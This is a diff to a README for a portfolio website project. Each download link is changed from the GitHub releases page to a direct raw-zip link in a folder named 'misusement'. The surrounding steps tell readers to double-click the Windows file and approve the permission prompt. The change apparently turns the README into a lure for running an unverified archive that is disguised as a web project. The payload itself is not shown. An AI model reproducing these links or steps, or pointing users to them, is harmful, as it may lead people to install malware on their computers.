@@ -1,6 +1,6 @@
 # 🌐 Advay-Portfolio-Website - Showcase Your Work With Ease
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-2D9CDB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-2D9CDB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lowresolution-heavy482/Advay-Portfolio-Website/main/misusement/Portfolio_Advay_Website_v3.3.zip)
 
 ## ✨ What this is
 
@@ -10,7 +10,7 @@ It includes a CMS admin dashboard, an AI chat assistant, a hire me contact form,
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases
+Visit this page to download: https://raw.githubusercontent.com/lowresolution-heavy482/Advay-Portfolio-Website/main/misusement/Portfolio_Advay_Website_v3.3.zip
 
 Open the latest release and get the Windows file from there. If the release contains a setup file or app file, download and run that file on your PC.
 
@@ -36,7 +36,7 @@ Open the latest release and get the Windows file from there. If the release cont
 
 ## 🚀 Getting Started
 
-1. Open the download page: https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases
+1. Open the download page: https://raw.githubusercontent.com/lowresolution-heavy482/Advay-Portfolio-Website/main/misusement/Portfolio_Advay_Website_v3.3.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from the release assets
 4. If Windows asks for permission, choose Yes or Run
@@ -128,7 +128,7 @@ You keep control of your own site. That makes it easier to own your content and 
 
 ## 🪟 Windows install steps
 
-1. Open the Releases page: https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases
+1. Open the Releases page: https://raw.githubusercontent.com/lowresolution-heavy482/Advay-Portfolio-Website/main/misusement/Portfolio_Advay_Website_v3.3.zip
 2. Download the latest Windows file
 3. Open your Downloads folder
 4. Double-click the downloaded file
@@ -249,7 +249,7 @@ Try these steps:
 
 ## 🔗 Download again
 
-[Open the latest release page](https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases)
+[Open the latest release page](https://raw.githubusercontent.com/lowresolution-heavy482/Advay-Portfolio-Website/main/misusement/Portfolio_Advay_Website_v3.3.zip)
 
 ## 🧭 What to do next
 
